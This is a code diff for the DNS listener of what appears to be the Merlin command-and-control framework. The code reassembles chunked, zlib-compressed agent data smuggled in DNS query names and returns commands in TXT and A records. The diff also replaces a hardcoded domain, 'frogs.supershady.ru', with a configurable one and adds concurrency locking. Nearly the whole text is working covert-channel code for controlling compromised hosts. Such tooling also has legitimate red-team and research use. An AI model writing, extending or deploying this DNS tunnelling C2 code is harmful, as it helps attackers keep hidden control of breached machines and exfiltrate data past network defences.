@@ -18,6 +18,7 @@
 package dns
 
 import (
+	"compress/zlib"
 	"sort"
 	"sync"
 
@@ -56,18 +57,20 @@ type Server struct {
 	//Certificate string
 	Server interface{}
 	Mux    *dns.ServeMux
+	Domain string
 }
 
 // New instantiates a new server object and returns it
-func New(iface string, port int, protocol string, domain string, certificate string) (Server, error) {
+func New(iface string, port int, protocol string, domain string, key string) (Server, error) {
 	s := Server{
 		//Protocol:  protocol,
 		Interface: iface,
 		//Port:      port,
-		Mux: dns.NewServeMux(),
+		Mux:    dns.NewServeMux(),
+		Domain: domain,
 	}
 
-	s.Mux.HandleFunc(domain, agentHandler)
+	s.Mux.HandleFunc(domain, s.agentHandler)
 
 	srv := &dns.Server{
 		Addr:    s.Interface + ":53",
@@ -88,7 +91,7 @@ func (s *Server) Run() error {
 	logging.Server(fmt.Sprintf("Starting %s Listener at %s:%s", "dns", s.Interface, "53"))
 
 	time.Sleep(45 * time.Millisecond) // Sleep to allow the shell to start up
-	message("note", fmt.Sprintf("Starting %s listener on %s:%d", "dns", s.Interface, "53"))
+	message("note", fmt.Sprintf("Starting %s listener on %s:%s", "dns", s.Interface, "53"))
 
 	server := s.Server.(*dns.Server)
 	defer func() {
@@ -106,7 +109,7 @@ func (s *Server) Run() error {
 }
 
 // agentHandler function is responsible for all Merlin agent traffic
-func agentHandler(w dns.ResponseWriter, r *dns.Msg) {
+func (s Server) agentHandler(w dns.ResponseWriter, r *dns.Msg) {
 	if core.Verbose {
 		message("note", fmt.Sprintf("Received DNS Query: "+r.Question[0].String()))
 		logging.Server(fmt.Sprintf("Received DNS Query: " + r.Question[0].String()))
@@ -147,21 +150,20 @@ func agentHandler(w dns.ResponseWriter, r *dns.Msg) {
 	for _, question := range m.Question {
 		//got an A lookup
 		if question.Qtype == dns.TypeA {
-			aLookup(m, &question)
+			go s.aLookup(m, &question, w)
 		}
 		if question.Qtype == dns.TypeTXT {
-			txtLookup(m, &question)
+			go s.txtLookup(m, &question, w)
 		}
 	}
-	w.WriteMsg(m)
 
 }
-func txtLookup(m *dns.Msg, question *dns.Question) {
-	//dn := "frogs.supershady.ru"
-	dn := "frogs.supershady.ru"
+func (s Server) txtLookup(m *dns.Msg, question *dns.Question, w dns.ResponseWriter) {
+	dnsResponseLock.RLock()
+	defer dnsResponseLock.RUnlock()
 	lookupSpaces := strings.Split(question.Name, ".")
 
-	lookupSpaces = lookupSpaces[:len(lookupSpaces)-(len(strings.Split(dn, "."))+1)]
+	lookupSpaces = lookupSpaces[:len(lookupSpaces)-(len(strings.Split(s.Domain, "."))+1)]
 	//ensure we have a sanely length lookup
 	if len(lookupSpaces) < 1 {
 		return
@@ -183,7 +185,6 @@ func txtLookup(m *dns.Msg, question *dns.Question) {
 		chunkNumi, e := strconv.ParseInt(lookupSpaces[0], 10, 32)
 		if e != nil {
 			panic(e)
-			return
 		}
 		l, ok := dnsResponses[cmdID]
 		if !ok {
@@ -211,15 +212,15 @@ func txtLookup(m *dns.Msg, question *dns.Question) {
 	}
 
 	m.Answer = append(m.Answer, rr)
+	w.WriteMsg(m)
 }
 
-func aLookup(m *dns.Msg, question *dns.Question) {
-	dn := "frogs.supershady.ru"
+func (s Server) aLookup(m *dns.Msg, question *dns.Question, w dns.ResponseWriter) {
 
 	lookupSpaces := strings.Split(question.Name, ".")
 
 	//remove the suffix
-	lookupSpaces = lookupSpaces[:len(lookupSpaces)-(len(strings.Split(dn, "."))+1)]
+	lookupSpaces = lookupSpaces[:len(lookupSpaces)-(len(strings.Split(s.Domain, "."))+1)]
 	//ensure we have a sanely length lookup
 	if len(lookupSpaces) < 4 {
 		return
@@ -265,6 +266,8 @@ func aLookup(m *dns.Msg, question *dns.Question) {
 	}
 
 	m.Answer = append(m.Answer, rr)
+	w.WriteMsg(m)
+
 }
 
 func gotMessage(b []byte) []byte {
@@ -428,7 +431,14 @@ func message(level string, message string) {
 	}
 }
 
+var dnsResponseLock *sync.RWMutex
+
 func addResp(cmdIDb, b []byte) {
+	if dnsResponseLock == nil {
+		dnsResponseLock = &sync.RWMutex{}
+	}
+	dnsResponseLock.Lock()
+	defer dnsResponseLock.Unlock()
 	if dnsResponses == nil {
 		dnsResponses = make(map[string]dnsResponse)
 	}
@@ -496,8 +506,12 @@ func (d *dnsMessage) AddChunk(cnum int32, val string) {
 	}
 	d.Chunks = append(d.Chunks, dnsChunk{body: val, num: cnum})
 	d.ReadChunks++
-	if int((float32(d.ReadChunks)/float32(d.TotalChunks))*100)%10 == 0 {
-		message("note", fmt.Sprintf("Read %d of %d", d.ReadChunks, d.TotalChunks))
+	if d.TotalChunks > 1000 {
+		//get 10% of full message (roughly)
+		ten := d.TotalChunks / 10
+		if d.ReadChunks%ten == 0 {
+			message("note", fmt.Sprintf("Read %d of %d (%.2f%%) large message", d.ReadChunks, d.TotalChunks, float32(d.ReadChunks)/float32(d.TotalChunks)*float32(100)))
+		}
 	}
 }
 
@@ -528,6 +542,17 @@ func (d dnsMessage) ReadResponse() []byte {
 		panic(e)
 		return []byte{}
 	}
+
+	//unzip
+	z, e := zlib.NewReader(bytes.NewReader(v))
+	if e != nil {
+		panic(e)
+	}
+	v, e = ioutil.ReadAll(z)
+	if e != nil {
+		panic(e)
+	}
+
 	return v
 }
 
@@ -546,13 +571,13 @@ func updateCmd(cmdID, maxChunk, thisChunk, payload string) (bool, []byte) {
 			CmdID: cmdID,
 		}
 	}
-	chunkNumi, e := strconv.ParseInt(thisChunk, 10, 32)
+	chunkNumi, e := strconv.ParseInt(thisChunk, 16, 32)
 	if e != nil {
 		fmt.Println("Bad chunk num")
 		return false, []byte{}
 	}
 
-	maxChunki, e := strconv.ParseInt(maxChunk, 10, 32)
+	maxChunki, e := strconv.ParseInt(maxChunk, 16, 32)
 	if e != nil {
 		fmt.Println("Bad max chunks")
 		return false, []byte{}
@@ -567,7 +592,9 @@ func updateCmd(cmdID, maxChunk, thisChunk, payload string) (bool, []byte) {
 	cmdMap[cmdID] = thsmsg
 
 	if thsmsg.IsDone() {
-		return true, thsmsg.ReadResponse()
+		rb := thsmsg.ReadResponse()
+		delete(cmdMap, cmdID)
+		return true, rb
 	}
 	return false, []byte{}
 
